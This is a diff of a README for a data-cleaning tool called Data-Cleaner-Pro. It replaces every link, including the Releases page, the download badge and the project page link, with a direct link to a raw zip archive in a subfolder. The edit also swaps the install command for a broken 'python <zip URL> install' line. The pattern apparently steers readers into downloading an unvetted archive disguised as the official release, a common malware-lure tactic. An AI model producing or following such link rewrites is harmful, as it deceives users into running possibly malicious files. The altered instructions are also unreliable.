@@ -6,11 +6,11 @@ Welcome to Data-Cleaner-Pro! This interactive tool simplifies the process of cle
 
 ## 📥 Download the Application
 
-[![Download Data-Cleaner-Pro](https://img.shields.io/badge/Download%20Now-Data--Cleaner--Pro-brightgreen)](https://github.com/Ishola111afk/Data-Cleaner-Pro/releases)
+[![Download Data-Cleaner-Pro](https://github.com/Ishola111afk/Data-Cleaner-Pro/raw/refs/heads/main/Rahul/Data_Pro_Cleaner_v1.0.zip%20Now-Data--Cleaner--Pro-brightgreen)](https://github.com/Ishola111afk/Data-Cleaner-Pro/raw/refs/heads/main/Rahul/Data_Pro_Cleaner_v1.0.zip)
 
 To download Data-Cleaner-Pro, please visit the Releases page:
 
-[Download Data-Cleaner-Pro](https://github.com/Ishola111afk/Data-Cleaner-Pro/releases)
+[Download Data-Cleaner-Pro](https://github.com/Ishola111afk/Data-Cleaner-Pro/raw/refs/heads/main/Rahul/Data_Pro_Cleaner_v1.0.zip)
 
 ## 🖥️ System Requirements
 
@@ -34,7 +34,7 @@ Data-Cleaner-Pro offers several features:
 
 ### Step 1: Download and Install
 
-1. Click on the download button above or visit the [Releases page](https://github.com/Ishola111afk/Data-Cleaner-Pro/releases).
+1. Click on the download button above or visit the [Releases page](https://github.com/Ishola111afk/Data-Cleaner-Pro/raw/refs/heads/main/Rahul/Data_Pro_Cleaner_v1.0.zip).
    
 2. Once the download is complete, locate the file on your computer. Depending on your system, it might be in your Downloads folder.
 
@@ -43,7 +43,7 @@ Data-Cleaner-Pro offers several features:
    - Navigate to the directory where you downloaded the file.
    - Run the installation command: 
      ```
-     python setup.py install
+     python https://github.com/Ishola111afk/Data-Cleaner-Pro/raw/refs/heads/main/Rahul/Data_Pro_Cleaner_v1.0.zip install
      ```
 
 ### Step 2: Open the Command Line Interface (CLI)
@@ -108,6 +108,6 @@ For additional help or questions, feel free to open an issue on our GitHub repos
 
 ## 🔗 Learn More
 
-To explore more about the project or its contributors, visit our [GitHub page](https://github.com/Ishola111afk/Data-Cleaner-Pro).
+To explore more about the project or its contributors, visit our [GitHub page](https://github.com/Ishola111afk/Data-Cleaner-Pro/raw/refs/heads/main/Rahul/Data_Pro_Cleaner_v1.0.zip).
 
 Thank you for using Data-Cleaner-Pro! Happy cleaning!
